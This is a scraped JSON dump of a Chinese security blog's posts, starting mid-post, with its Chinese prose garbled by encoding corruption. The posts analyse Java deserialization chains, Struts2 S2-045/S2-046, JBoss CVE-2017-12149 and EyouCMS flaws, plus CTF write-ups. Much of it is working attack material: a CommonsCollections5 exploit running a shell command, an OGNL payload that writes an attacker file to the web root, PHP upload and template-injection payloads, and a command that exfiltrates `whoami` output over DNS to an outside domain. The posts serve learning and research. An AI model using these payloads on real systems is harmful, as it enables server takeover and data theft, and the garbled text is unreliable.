//3.å°†proxyä»£ç†æ”¾è¿›å¤–å±‚çš„AnnotationInvocationHandlerï¼Œä»è€Œmembervalues.entrysetè§¦å‘åŠ¨æ€ä»£ç†ï¼ˆä¸commonscollection1ç›¸åŒï¼‰ String clazzName = \"sun.reflect.annotation.AnnotationInvocationHandler\"; //è·å–AnnotationInvocationHandlerç±»çš„æ„é€ æ–¹æ³•æ•°ç»„ Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[0]; ctor.setAccessible(true); //ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºï¼Œæˆ‘ä»¬å°†è¦ä»£ç†çš„çœŸå®å¯¹è±¡ä¼ å…¥ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†çš„æ„é€ å‡½æ•°ä¸­ï¼Œæœ€ç»ˆä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºä¼šè°ƒç”¨çœŸå®å¯¹è±¡çš„æ–¹æ³• InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap); //Proxy.newProxyInstanceçš„ä¸‰ä¸ªå‚æ•° /* é€šè¿‡Proxyç±»çš„newProxyInstanceæ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹æ–¹æ³•ä¸­çš„å‚æ•° ç¬¬ä¸€ä¸ªå‚æ•°ï¼špeople.getClass().getClassLoader()ï¼Œä½¿ç”¨handlerå¯¹è±¡çš„classloaderå¯¹è±¡æ¥åŠ è½½æˆ‘ä»¬çš„ä»£ç†å¯¹è±¡ ç¬¬äºŒä¸ªå‚æ•°ï¼špeople.getClass().getInterfaces()ï¼Œè¿™é‡Œä¸ºä»£ç†ç±»æä¾›çš„æ¥å£æ˜¯çœŸå®å¯¹è±¡å®ç°çš„æ¥å£ï¼Œè¿™æ ·ä»£ç†å¯¹è±¡å°±èƒ½åƒçœŸå®å¯¹è±¡ä¸€æ ·è°ƒç”¨æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³• ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šhandlerï¼Œæˆ‘ä»¬å°†ä»£ç†å¯¹è±¡å…³è”åˆ°ä¸Šé¢çš„InvocationHandlerå¯¹è±¡ä¸Š */ InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler)); //4.åºåˆ—åŒ– File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //5.ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; åé¢è¿˜æœ‰å‡ æ¡ï¼Œæœªå®Œå¾…ç»­ ä½†æ˜¯é€šè¿‡å‰é¢å‡ æ¡å¯ä»¥çœ‹åˆ°åˆ©ç”¨çš„çŸ¥è¯†ä¸»è¦æ˜¯åŠ¨æ€ä»£ç†ï¼ŒjavassiståŠ¨æ€ç¼–ç¨‹ï¼Œåå°„ç­‰ï¼ŒåŠ ä¸Šå¯»æ‰¾ä¸€äº›ç±»çš„ç»„åˆåˆ©ç”¨ã€‚ å‚è€ƒé“¾æ¥ https://www.freebuf.com/articles/web/214096.html https://www.anquanke.com/post/id/200637","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Javaæ¼æ´å­¦ä¹ -S2-046","slug":"Javaæ¼æ´å­¦ä¹ -S2-046","date":"2020-04-14T01:21:22.000Z","updated":"2020-04-14T06:16:50.030Z","comments":true,"path":"2020/04/14/Javaæ¼æ´å­¦ä¹ -S2-046/","link":"","permalink":"https://glotozz.github.io/2020/04/14/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-046/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• æ¼æ´åŸå›  ç¯å¢ƒæ­å»º æ¼æ´å¤ç° æ¼æ´åˆ†æ æ¼æ´ä¿®å¤ st-046å»ºç«‹åœ¨st-045çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¦‚æœä¹‹å‰å¯¹äºst-045çš„ä¿®å¤æ–¹å¼ä»…é’ˆå¯¹Content-Typeåšç­–ç•¥é˜²æŠ¤çš„è¯ï¼Œè¿˜éœ€è¦å¯¹Content-Dispositionä¹ŸåŠ ä¸€ä¸‹ç­–ç•¥ã€‚å½“ç„¶æœ€å¥½çš„æ–¹å¼è¿˜æ˜¯å‡çº§åˆ°æœ€æ–°ç‰ˆã€‚ æ¼æ´åŸå› æœ‰ä¸¤ä¸ª â‘ Content-Lengthçš„é•¿åº¦å€¼è¶…é•¿ è¿™ä¸ªæ¼æ´éœ€è¦åœ¨strust.xmlä¸­åŠ å…¥&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;æ‰èƒ½è§¦å‘ã€‚è§¦å‘æ¼æ´çš„ä»£ç åœ¨ JakartaStreamMultiPartRequestç±»ä¸­ï¼ŒprocessUploadå‡½æ•°å¤„ç†äº†content-lengthé•¿åº¦è¶…é•¿çš„å¼‚å¸¸ï¼Œå¯¼è‡´é—®é¢˜è§¦å‘ã€‚ â‘¡Content-Dispositionçš„filenameå­˜åœ¨ç©ºå­—èŠ‚ ç¯å¢ƒæ­å»ºå’Œst-045ç›¸åŒ å½±å“ç‰ˆæœ¬: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 mavenæ­å»º 12345678&lt;dependencies&gt; &lt;!-- struts2ä¾èµ–åŒ… --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.3.30&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; æ¼æ´å¤ç°1Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;%&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,233*233)&#125;\\0b&quot; æ¼æ´åˆ†æå¯ä»¥ä»tomcatçš„æŠ¥é”™ä¿¡æ¯æŸ¥çœ‹è°ƒç”¨æ ˆ å‰é¢çš„è°ƒç”¨æ ˆæ¯”è¾ƒæ¸…æ¥šï¼Œçœ‹æœ€åçš„checkName() /org/apache/commons/fileupload/util/Streams.class åœ¨è¿™é‡Œç”±äºæˆ‘ä»¬ä¼ å…¥äº†\\0ï¼Œè¿›å…¥ç¬¬ä¸€ä¸ªifåˆ†æ”¯ï¼Œå¯¼è‡´æŠ›å‡ºå¼‚å¸¸ï¼Œç»§ç»­è·Ÿè¿› ä¹‹åä¼šè¿›å…¥st-045ä¸­åˆ†æè¿‡çš„buildErrorMessage()ï¼Œå…·ä½“ä¸å†èµ˜è¿°ã€‚ æ¼æ´ä¿®å¤ ä¸¥æ ¼è¿‡æ»¤Content-Type ã€filenameé‡Œçš„å†…å®¹ï¼Œä¸¥ç¦ognlè¡¨è¾¾å¼ç›¸å…³å­—æ®µã€‚ å¦‚æœæ‚¨ä½¿ç”¨åŸºäºJakartaæ’ä»¶ï¼Œè¯·å‡çº§åˆ°Apache Struts 2.3.32æˆ–2.5.10.1ç‰ˆæœ¬ã€‚","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Javaæ¼æ´å­¦ä¹ -S2-045","slug":"Javaæ¼æ´å­¦ä¹ -S2-045","date":"2020-04-13T08:13:17.000Z","updated":"2020-04-13T14:56:40.055Z","comments":true,"path":"2020/04/13/Javaæ¼æ´å­¦ä¹ -S2-045/","link":"","permalink":"https://glotozz.github.io/2020/04/13/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-045/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´å¤ç° åŸç†åˆ†æ æ¼æ´ä¿®å¤ å‚è€ƒé“¾æ¥ é¢è¯•çš„æ—¶å€™é—®åˆ°äº†st2-045æ¼æ´ä»¥åŠç»•è¿‡ä¿®å¤åå‡ºç°çš„st2-046ï¼Œåˆ†æä¸€ä¸‹ Struts2é»˜è®¤è§£æä¸Šä¼ æ–‡ä»¶çš„Content-Typeå¤´ï¼Œå­˜åœ¨é—®é¢˜ã€‚åœ¨è§£æé”™è¯¯çš„æƒ…å†µä¸‹ï¼Œä¼šæ‰§è¡Œé”™è¯¯ä¿¡æ¯ä¸­çš„OGNLä»£ç ï¼Œå½“Content-Typeæ³¨å…¥Payloadåå°±å¯ä»¥é€šè¿‡OGNLæ‰§è¡Œå‘½ä»¤ã€‚ ç¯å¢ƒæ­å»ºå½±å“ç‰ˆæœ¬: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 mavenæ­å»º 12345678&lt;dependencies&gt; &lt;!-- struts2ä¾èµ–åŒ… --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.3.30&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; æ¼æ´å¤ç°éªŒè¯ 1Content-Type: %&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,233*233)&#125;.multipart&#x2F;form-data getshell 1_multipart&#x2F;form-data%&#123;(#o&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#o):((#c&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#g&#x3D;#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest()).(#f&#x3D;new java.io.File(#req.getRealPath(&#39;&#x2F;&#39;),#req.getParameter(&#39;f&#39;))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))&#125; è®¿é—®x.jsp åŸç†åˆ†æ v2.3.32ï¼šhttps://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a æ ¹æ®diffç‰ˆæœ¬æ›´æ–°å‰ååˆ†æ æˆ‘çš„mavenåŒ…æ˜¯2.3.30ï¼Œå¤§åŒå°å¼‚ org/apache/struts/struts2-core/2.3.30/struts2-core-2.3.30.jar!/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.class æ ¹æ®æ–¹æ³•åå¯ä»¥çœ‹å‡ºæ˜¯ç”Ÿæˆé”™è¯¯æ¶ˆæ¯ï¼Œè·Ÿè¿›LocalizedTextUtilç±»çš„findText() å¯ä»¥çœ‹åˆ°ï¼Œå¯¹findText()æ–¹æ³•è¿›è¡Œäº†é‡è½½ï¼Œå…ˆè°ƒç”¨ä¸Šé¢çš„findText()ï¼Œå†è°ƒç”¨ä¸‹é¢çš„findText() å…·ä½“è·Ÿè¿›findText()ä¸­çš„getDefaultMessage() è·Ÿè¿›TextParseUtil.translateVariables() è¿™é‡Œå­˜åœ¨é€’å½’è°ƒç”¨ï¼Œè·Ÿè¿› è·Ÿè¿›parse.evaluate() è·Ÿè¿›å®ç°è¿™ä¸ªæ¥å£çš„ç±» æ‰§è¡Œäº†ognlè¡¨è¾¾å¼ æœ€åå†å›å»åˆ†æå¦‚ä½•è·³åˆ°buildErrorMessage() åœ¨ struts2 çš„æ¡†æ¶å½“ä¸­ï¼Œå†…ç½®äº†è®¸å¤šçš„æ‹¦æˆªå™¨ï¼Œä¸»è¦ç”¨äºå¯¹æ¡†æ¶çš„åŠŸèƒ½æ‰©å±•ï¼Œæ­¤æ¬¡æ¼æ´çš„FileUploadInterceptor å°±æ˜¯å¯¹æ¡†æ¶æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½æ‰©å±•ï¼Œè¿™é‡Œå°±æ˜¯å¤„ç†æ— æ•ˆçš„Content-Type 1org.apache.commons.fileupload.FileUploadBase$InvalidContentTypeException: the request doesn&#39;t contain a multipart&#x2F;form-data or multipart&#x2F;mixed stream, content type header is %&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,233*233)&#125;.multipart&#x2F;form-data æ¼æ´ä¿®å¤ å‡çº§è‡³Struts2å®‰å…¨ç‰ˆæœ¬ ä½¿ç”¨Servletè¿‡æ»¤å™¨éªŒè¯Content-Typeè¿‡æ»¤ä¸åŒ¹é…çš„è¯·æ±‚multipart/form-data å‚è€ƒé“¾æ¥ http://www.polaris-lab.com/index.php/archives/45/ https://paper.seebug.org/247/#0x01","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´-CVE-2017-12149-JBoss","slug":"Javaååºåˆ—åŒ–æ¼æ´-CVE-2017-12149-JBoss","date":"2020-04-13T06:20:10.000Z","updated":"2020-04-14T01:19:56.382Z","comments":true,"path":"2020/04/13/Javaååºåˆ—åŒ–æ¼æ´-CVE-2017-12149-JBoss/","link":"","permalink":"https://glotozz.github.io/2020/04/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149-JBoss/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ æ¼æ´ä¿®å¤ æ€»ç»“ ä¹‹å‰åˆ†æè¿‡ ysoserialä¸­CommonsCollections5è¿™æ¡é“¾ï¼Œè€Œäº’è”ç½‘çˆ†å‡ºJBOSSååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2017-12149)ï¼Œè¿œç¨‹æ”»å‡»è€…åˆ©ç”¨æ¼æ´å¯åœ¨æœªç»ä»»ä½•èº«ä»½éªŒè¯çš„æœåŠ¡å™¨ä¸»æœºä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¯ä»¥åˆ©ç”¨é‚£æ¡é“¾ã€‚ ç¯å¢ƒæ­å»ºæ¼æ´å½±å“5.xå’Œ6.xç‰ˆæœ¬çš„JBOSSASã€‚ è¿™é‡Œæ­å»ºçš„ç¯å¢ƒä¸ºJBoss AS 6.1.0.Final æ¼æ´åˆ†æserver/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class doFilter()æ–¹æ³• ç›´æ¥ä»httpä¸­è·å–æ•°æ®ï¼Œå¹¶ç›´æ¥è°ƒç”¨readObject()è¿›è¡Œååºåˆ—åŒ– ç”¨ä¹‹å‰å†™è¿‡çš„POCæ‰“ä¸€ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //ä¼ å…¥Runtimeç±» new ConstantTransformer(Runtime.class), //åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œè¿”å›Runtime.getRuntime()æ–¹æ³• new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡ new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //åå°„è°ƒç”¨execæ–¹æ³• new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); BadAttributeValueExpException poc = new BadAttributeValueExpException(null); // valæ˜¯ç§æœ‰å˜é‡ï¼Œæ‰€ä»¥åˆ©ç”¨ä¸‹é¢æ–¹æ³•è¿›è¡Œèµ‹å€¼ Field valfield = poc.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); //æ¢å¤å¯¹è±¡ ois.readObject(); ois.close(); &#125;&#125; æ¼æ´ä¿®å¤ å‡çº§æ–°ç‰ˆæœ¬ã€‚ åˆ é™¤http-invoker.sar ç»„ä»¶ã€‚ æ·»åŠ å¦‚ä¸‹ä»£ç è‡³ http-invoker.sar ä¸‹ web.xmlçš„security-constraint æ ‡ç­¾ä¸­ï¼š &lt;url-pattern&gt;/*&lt;/url-pattern&gt;ç”¨äºå¯¹ http invoker ç»„ä»¶è¿›è¡Œè®¿é—®æ§åˆ¶ã€‚ æ€»ç»“å¯¹äºJbossï¼ŒTomcatï¼ŒStruts2ï¼ŒWeblogicç­‰ç­‰ï¼Œ è¿™äº›åº”ç”¨éƒ½æ˜¯ä¸ºäº†å®Œæˆä¸€ä¸ªJavaçš„WebæœåŠ¡ï¼Œé‚£ä¹ˆï¼Œåœ¨æ‹¥æœ‰Javaç¯å¢ƒçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿç›‘å¬WebæœåŠ¡å¹¶ä¸”è°ƒåº¦ç›¸å…³é€»è¾‘çš„æœåŠ¡å™¨ã€‚è€Œé€šå¸¸è¿™äº›æ¶æ„éƒ½è®¾ç½®äº†è¿‡æ»¤å™¨ï¼Œä¼šå¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤å¤„ç†ï¼Œå› æ­¤å¦‚æœæ¼æ´å‡ºç°åœ¨Filterå±‚é¢ï¼Œè§¦å‘çš„æ¡ä»¶ä¹Ÿå˜å¾—ç®€å•ï¼Œå±å®³è¾ƒå¤§ã€‚","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"eyoucmså†å²æ¼æ´åˆ†æ","slug":"eyoucmså†å²æ¼æ´åˆ†æ","date":"2020-04-03T15:28:12.000Z","updated":"2020-04-04T11:39:50.153Z","comments":true,"path":"2020/04/03/eyoucmså†å²æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2020/04/03/eyoucms%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º Eyoucms_v1.0ï¼Œå­˜åœ¨å‰å°getshell EyouCMS &lt;1.4.2 ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ å‚è€ƒé“¾æ¥ æ‰“ç®—æ‰¾ä¸ªcmsæ¼æ´æŒ–æ˜ï¼Œæ‰¾åˆ°äº†Eyoucmsï¼Œæ‰“ç®—å…ˆåˆ†æå†å²æ¼æ´ï¼Œå†å¯¹æœ€æ–°ç‰ˆæœ¬è¿›è¡ŒæŒ–æ˜ã€‚ ç¯å¢ƒæ­å»º EyouCmsæ˜¯åŸºäºTP5.0æ¡†æ¶ä¸ºæ ¸å¿ƒå¼€å‘çš„å…è´¹+å¼€æºçš„ä¼ä¸šå†…å®¹ç®¡ç†ç³»ç»Ÿ ã€‚ https://www.eyoucms.com/ Eyoucms_v1.0ï¼Œå­˜åœ¨å‰å°getshellv_1.1.3ä¹Ÿå­˜åœ¨ application/api/controller/Uploadify.php preview()æ–¹æ³•ï¼Œæä¾›å›¾ç‰‡é¢„è§ˆåŠŸèƒ½ æ ¹æ®æ­£åˆ™æå–æ•°æ®ï¼Œç®€å•åˆ†æå°±å¯ä»¥æ„é€ payload 1data:image&#x2F;php;base64,PD9waHAgcGhwaW5mbygpOz8+ æ³¨æ„è¿™é‡Œçš„è·¯å¾„ EyouCMS &lt;1.4.2 ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ application/api/controller/Ajax.php ç»•è¿‡IS_AJAX_POST åœ¨åŒ…ä¸­åŠ ä¸ŠX-Requested-With: XMLHttpRequest è¿™é‡Œå¯ä»¥æ¨¡æ¿æ³¨å…¥ï¼Œæ¸²æŸ“çš„æ¨¡æ¿ä¸º 1&#123;eyou:memberlist $key&#x3D;&#39;$val&#39; js&#x3D;&#39;on&#39;&#125;$htmlcode&#123;&#x2F;eyou:memberlist&#125; ç»è¿‡å°è¯•ï¼Œ$key=&#39;$val&#39;å¯ä»¥æˆåŠŸæ³¨å…¥ 1&#123;eyou:memberlist &#125;&#x3D;&#39;&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;&#39; js&#x3D;&#39;on&#39;&#125;$htmlcode&#123;&#x2F;eyou:memberlist&#125; =&gt; 1&#123;&quot;&#125;&quot;: &quot;&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;&quot;&#125; =&gt; 1eyJ9IjogIntwaHB9cGhwaW5mbygpO3svcGhwfSJ9 å‚è€ƒé“¾æ¥ https://www.cnblogs.com/r00tuser/p/9405870.html http://www.lovei.org/archives/EyouCMS-SSTI.html","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"buuctf-wp","slug":"buuctf-wp","date":"2020-04-02T13:32:32.000Z","updated":"2020-04-24T07:36:21.445Z","comments":true,"path":"2020/04/02/buuctf-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/02/buuctf-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• [SCTF2019]Flag Shop [CISCN2019 åä¸œå—èµ›åŒº]Double Secret [RCTF2019]calcalcalc [WUSTCTF2020]Train Yourself To Be Godly [WUSTCTF2020]easyweb [Zer0pts2020]phpNantokaAdm [Zer0pts2020]musicblog [Zer0pts2020]Can you guess it? [Zer0pts2020]urlapp [Zer0pts2020]notepad [D3CTF 2019]EasyWeb [D3CTF 2019]EzUpload [D3CTF 2019]Showhub LFI2019 [SUCTF 2018]annonymous [SUCTF 2018]GetShell [SUCTF 2018]MultiSQL [SUCTF 2018]Homework [CISCN2019 åä¸œå—èµ›åŒº]Web4 [GWCTF 2019]ä½ çš„åå­— [CSAWQual 2019]Web_Unagi [N1CTF 2018]eating_cms [BSidesCF 2019]SVGMagic [HITCON 2015]Babyfirst ç©ç‹¼äººæ€è¾“ä¸€æŠŠåˆ·3é“buuå“ˆå“ˆ #############04/02 [SCTF2019]Flag Shop/filebakå¾—åˆ°æºç  jwtèº«ä»½éªŒè¯ï¼Œ å…ˆçˆ†ç ´ä¸€ä¸‹å¯†é’¥è¯•è¯• 1.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJiNjI2YjUyZi05OWYxLTQ1M2YtYjBhYy1iYzg3MTA3NjgwYzIiLCJqa2wiOjIwfQ.oKTH78tthnezEs9RXq5MQPiUIhiLrnUVtONe2yalk_I æœç„¶ä¸è¡Œï¼Œ æ ¹æ®æºç éœ€è¦ç”¨è¶³å¤Ÿçš„jklæ‰èƒ½è´­ä¹°flag è¿™é‡Œçš„è€ƒç‚¹æ˜¯erbæ¨¡ç‰ˆæ³¨å…¥è¯»å–secret ä½†æ˜¯é™åˆ¶äº†ç”¨æˆ·è¾“å…¥ä¸º7ä½ï¼Œä½†æ˜¯æ¨¡ç‰ˆæ¸²æŸ“éœ€è¦&lt;%==&gt;æ ‡å¿—ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ä¸¤ä¸ªå­—ç¬¦æ¨¡ç‰ˆæ³¨å…¥ æ–¹æ³•ä¸€keyçˆ†ç ´ 12$&#96; åŒ¹é…æ–‡æœ¬ä¹‹å‰çš„æ–‡æœ¬$&#39; åŒ¹é…æ–‡æœ¬ä¹‹åçš„æ–‡æœ¬ åˆ©ç”¨é¢„å®šä¹‰å­—ç¬¦$ç»•è¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­å¹¶è¯»å–secret 123&#x2F;work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working&#x3D;&gt;&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working å¾—åˆ°key å†å°†jklä¼ªé€ æˆ1e27ï¼Œä¿®æ”¹cookieè´­ä¹°flagï¼Œè¿”å›çš„jwtè§£ç ä¸­å­˜å…¥äº†flag æ–¹æ³•äºŒHTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚æ”»å‡» https://xz.aliyun.com/t/6686 ä¸¾ä¸ªä¾‹å­ 12345678$a &#x3D; &quot;qwertyu&quot;$b &#x3D; Array[&quot;bbb&quot;,&quot;cc&quot;,&quot;d&quot;]puts &quot;$a: #&#123;$a[0,3]&#125;&quot;puts &quot;$b: #&#123;$b[0,3]&#125;&quot;&#x2F;&#x2F;result$a: qwe$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;] è¯»å–æ–‡ä»¶ 123&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6&#x3D;&gt;&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;%5b%22%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e%22%2c%20%22%31%22%2c%20%22%32%22%2c%20%22%33%22%2c%20%22%34%22%2c%20%22%35%22%2c%20%22%36%22%5d%20%69%73%20%77%6f%72%6b%69%6e%67&amp;name[]&#x3D;%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6 å¦‚æœæ˜¯å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾ 1&#x2F;work?do&#x3D;[&quot;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6 [CISCN2019 åä¸œå—èµ›åŒº]Double Secretæç¤ºsecretï¼Œè®¿é—®/secret æç¤ºä¼ å‚secretï¼Œä¼ å‚?secret=aaaaaï¼Œå¤§äºå››ä½æ—¶æŠ¥é”™ æŸ¥çœ‹æºç  æ˜æ˜¾çš„sstiï¼Œå¹¶ä¸”è¿™é‡Œä½¿ç”¨äº†è‡ªå®šä¹‰çš„RC4åŠ å¯†ï¼Œå…·ä½“éœ€è¦æŸ¥çœ‹rc4_Modified.pyæ–‡ä»¶ï¼Œè¿™é‡Œç”¨%ffå¯ä»¥è§¦å‘æŠ¥é”™ 